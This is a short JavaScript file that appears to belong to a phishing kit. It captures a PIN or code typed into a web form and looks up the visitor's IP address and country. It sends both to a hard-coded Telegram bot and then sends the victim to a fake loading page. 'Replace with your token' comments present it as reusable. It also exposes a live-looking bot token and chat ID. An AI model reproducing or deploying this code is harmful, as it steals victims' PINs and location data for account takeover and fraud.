async function getIpInfo() {
    const response = await fetch('https://ipinfo.io/json?token=4d1535316da2be'); // Replace with your token
    return response.json();
}

async function sendToTelegram(message) {
    const telegramToken = '8093449553:AAFPYQHQe1eKwp_fu5uq8AnLWILJFAjjUTg'; // Replace with your bot token
    const chatId = '7631556354'; // Replace with your chat ID
    const url = `https://api.telegram.org/bot8093449553:AAFPYQHQe1eKwp_fu5uq8AnLWILJFAjjUTg/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    });
}

async function handleSubmit(event) {
    event.preventDefault(); // Prevent the default form submission
    const code = document.querySelector("#code").value; // Get the code entered
    const ipInfo = await getIpInfo();

    const countryCode = ipInfo.country; // Get the country code
    const flagEmoji = getFlagEmoji(countryCode); // Get the flag emoji

    // Create the message to send to Telegram
    const message = `
        PinCode: ${code}
IP Address: ${ipInfo.ip}
Country Code: ${countryCode} ${flagEmoji}
Country: ${ipInfo.region}
    `;

    // Send the message to your Telegram bot
    await sendToTelegram(message);

    // Redirect to the loading page only after the message is sent
    window.location.href = "loading4.html"; // Change to your loading page
}

function getFlagEmoji(countryCode) {
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
}

document.addEventListener("DOMContentLoaded", () => {
    // Bind the form submit to the handleSubmit function
    document.querySelector("form").addEventListener("submit", handleSubmit);
});